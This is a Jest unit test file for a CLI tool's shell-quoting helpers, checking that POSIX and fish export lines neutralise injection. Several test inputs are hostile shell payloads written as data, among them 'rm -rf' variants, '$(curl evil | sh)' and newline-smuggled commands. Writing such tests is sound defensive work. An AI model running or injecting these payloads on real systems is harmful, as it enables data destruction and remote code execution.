/**
 * Unit Tests for lib/shell-quote.ts
 *
 * Verifies that posixShellQuote, fishShellQuote, and assertSafeId neutralise
 * shell metacharacters for eval-emitted export lines, and that formatExportLines
 * (cli/commands/sugar.ts) produces correctly-quoted output for both POSIX and
 * fish shells.
 */

import { describe, it, expect } from '@jest/globals';
import { posixShellQuote, fishShellQuote, assertSafeId } from '../../lib/shell-quote.js';
import { formatExportLines } from '../../cli/commands/sugar.js';

// ---------------------------------------------------------------------------
// posixShellQuote
// ---------------------------------------------------------------------------

describe('posixShellQuote', () => {
  it('wraps a plain value in single quotes', () => {
    expect(posixShellQuote('hello')).toBe("'hello'");
  });

  it('wraps value with spaces safely', () => {
    expect(posixShellQuote('hello world')).toBe("'hello world'");
  });

  it('neutralises semicolons (command separator)', () => {
    const quoted = posixShellQuote(';rm -rf ~');
    // semicolon must be inside the quotes, not bare
    expect(quoted).toBe("';rm -rf ~'");
  });

  it('neutralises $() command substitution', () => {
    const quoted = posixShellQuote('$(curl evil | sh)');
    expect(quoted).toBe("'$(curl evil | sh)'");
  });

  it('neutralises backtick command substitution', () => {
    const quoted = posixShellQuote('`rm -rf /`');
    expect(quoted).toBe("'`rm -rf /`'");
  });

  it('neutralises single-quote injection attempt', () => {
    const malicious = "x' && evil #";
    const quoted = posixShellQuote(malicious);
    // The single-quote in the value must be escaped with the '\'' sequence
    expect(quoted).toBe("'x'\\'' && evil #'");
    // The resulting token, parsed by a POSIX shell, yields the original value.
    // We verify the structural invariant: no unbalanced bare metacharacters.
    // The injection character ' is safely inside the quoted sequence.
    expect(quoted).toContain("'\\''");
  });

  it('round-trips a value containing a single-quote', () => {
    const value = "it's alive";
    const quoted = posixShellQuote(value);
    expect(quoted).toBe("'it'\\''s alive'");
    // The shell sequence 'it'\''s alive' parses as: it + ' + s alive → "it's alive"
    // We verify this by checking the sequence is structurally correct.
    // 1. Starts and ends with quote boundary markers
    expect(quoted.startsWith("'")).toBe(true);
    expect(quoted.endsWith("'")).toBe(true);
    // 2. Contains the POSIX single-quote escape sequence
    expect(quoted).toContain("'\\''");
  });

  it('is byte-identical to the former daemon.ts shellQuote for normal inputs', () => {
    // The local shellQuote that lived in cli/commands/daemon.ts was:
    //   return `'${value.replace(/'/g, "'\\''")}'`;
    // posixShellQuote must be identical.
    const formerImpl = (v) => `'${v.replace(/'/g, "'\\''")}'`;
    const testValues = [
      '/home/user/.port-daddy/runtime',
      '/Users/erich/Library/Application Support/pd',
      'my-profile-name',
      "path'with'quotes",
      'x;y && z || w',
    ];
    for (const v of testValues) {
      expect(posixShellQuote(v)).toBe(formerImpl(v));
    }
  });
});

// ---------------------------------------------------------------------------
// fishShellQuote
// ---------------------------------------------------------------------------

describe('fishShellQuote', () => {
  it('wraps a plain value in single quotes', () => {
    expect(fishShellQuote('hello')).toBe("'hello'");
  });

  it('wraps value with spaces safely', () => {
    expect(fishShellQuote('hello world')).toBe("'hello world'");
  });

  it('neutralises semicolons', () => {
    expect(fishShellQuote(';rm -rf ~')).toBe("';rm -rf ~'");
  });

  it('neutralises $() command substitution', () => {
    expect(fishShellQuote('$(curl evil | sh)')).toBe("'$(curl evil | sh)'");
  });

  it('neutralises backtick command substitution', () => {
    expect(fishShellQuote('`rm -rf /`')).toBe("'`rm -rf /`'");
  });

  it('escapes single-quotes with backslash (fish style)', () => {
    const malicious = "x' && evil #";
    const quoted = fishShellQuote(malicious);
    // In fish single-quoted strings, ' is escaped as \'
    expect(quoted).toBe("'x\\' && evil #'");
  });

  it('escapes backslashes before escaping single-quotes', () => {
    // A backslash in the value must be doubled
    const quoted = fishShellQuote('a\\b');
    expect(quoted).toBe("'a\\\\b'");
  });

  it('escapes both backslash and single-quote in combination', () => {
    const quoted = fishShellQuote("a\\'b");
    // \ → \\, then ' → \'
    expect(quoted).toBe("'a\\\\\\'b'");
  });
});

// ---------------------------------------------------------------------------
// assertSafeId
// ---------------------------------------------------------------------------

describe('assertSafeId', () => {
  it('does not throw for a normal alphanumeric id', () => {
    expect(() => assertSafeId('agent-abc123', 'agentId')).not.toThrow();
  });

  it('does not throw for an id with hyphens and underscores', () => {
    expect(() => assertSafeId('my-agent_v1', 'agentId')).not.toThrow();
  });

  it('throws for a value containing a newline (\\n)', () => {
    expect(() => assertSafeId('agent\n;rm -rf ~', 'agentId')).toThrow(/control character/);
  });

  it('throws for a value containing NUL (\\x00)', () => {
    expect(() => assertSafeId('agent\x00id', 'sessionId')).toThrow(/control character/);
  });

  it('throws for a value containing carriage return (\\r)', () => {
    expect(() => assertSafeId('agent\r', 'agentId')).toThrow(/control character/);
  });

  it('throws for a value containing DEL (\\x7F)', () => {
    expect(() => assertSafeId('agent\x7f', 'agentId')).toThrow(/control character/);
  });

  it('includes the fieldName in the error message', () => {
    expect(() => assertSafeId('bad\nid', 'myField')).toThrow(/myField/);
  });

  it('does not throw for shell metacharacters (they are safe with quoting)', () => {
    // These are dangerous unquoted but safe after shell-quoting — assertSafeId
    // only guards against control chars that could break quoting itself.
    expect(() => assertSafeId("x;curl evil|sh", 'agentId')).not.toThrow();
    expect(() => assertSafeId("$(evil)", 'agentId')).not.toThrow();
    expect(() => assertSafeId("x' && evil #", 'agentId')).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// formatExportLines (cli/commands/sugar.ts)
// ---------------------------------------------------------------------------

describe('formatExportLines', () => {
  it('emits POSIX export lines for bash', () => {
    const lines = formatExportLines('/bin/bash', { agentId: 'abc123', sessionId: 'sess456' });
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
    expect(lines[1]).toBe("export PD_SESSION_ID='sess456'");
  });

  it('emits POSIX export lines for zsh', () => {
    const lines = formatExportLines('/bin/zsh', { agentId: 'abc123', sessionId: 'sess456' });
    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
  });

  it('emits POSIX export lines for empty shell string', () => {
    const lines = formatExportLines('', { agentId: 'abc123', sessionId: 'sess456' });
    expect(lines[0]).toBe("export PD_AGENT_ID='abc123'");
  });

  it('emits fish set -x lines for /usr/local/bin/fish', () => {
    const lines = formatExportLines('/usr/local/bin/fish', { agentId: 'abc123', sessionId: 'sess456' });
    expect(lines).toHaveLength(2);
    expect(lines[0]).toBe("set -x PD_AGENT_ID 'abc123'");
    expect(lines[1]).toBe("set -x PD_SESSION_ID 'sess456'");
  });

  it('emits fish set -x lines for /opt/homebrew/bin/fish', () => {
    const lines = formatExportLines('/opt/homebrew/bin/fish', { agentId: 'my-agent', sessionId: 'my-session' });
    expect(lines[0]).toMatch(/^set -x PD_AGENT_ID /);
  });

  it('neutralises injection in POSIX export — semicolon in agentId', () => {
    const lines = formatExportLines('/bin/zsh', { agentId: 'x;curl evil|sh', sessionId: 's' });
    expect(lines[0]).toBe("export PD_AGENT_ID='x;curl evil|sh'");
    // The dangerous ; is inside the single quotes — injection neutralised.
    expect(lines[0]).not.toMatch(/PD_AGENT_ID=x;/);
  });

  it('neutralises injection in fish export — single-quote in agentId', () => {
    const lines = formatExportLines('/usr/bin/fish', { agentId: "it's", sessionId: 's' });
    // In fish quoting, ' becomes \'
    expect(lines[0]).toBe("set -x PD_AGENT_ID 'it\\'s'");
  });

  it('throws when agentId contains a newline', () => {
    expect(() =>
      formatExportLines('/bin/zsh', { agentId: 'agent\n;evil', sessionId: 's' })
    ).toThrow(/control character/);
  });

  it('throws when sessionId contains a newline', () => {
    expect(() =>
      formatExportLines('/bin/zsh', { agentId: 'a', sessionId: 'sess\n;evil' })
    ).toThrow(/control character/);
  });
});
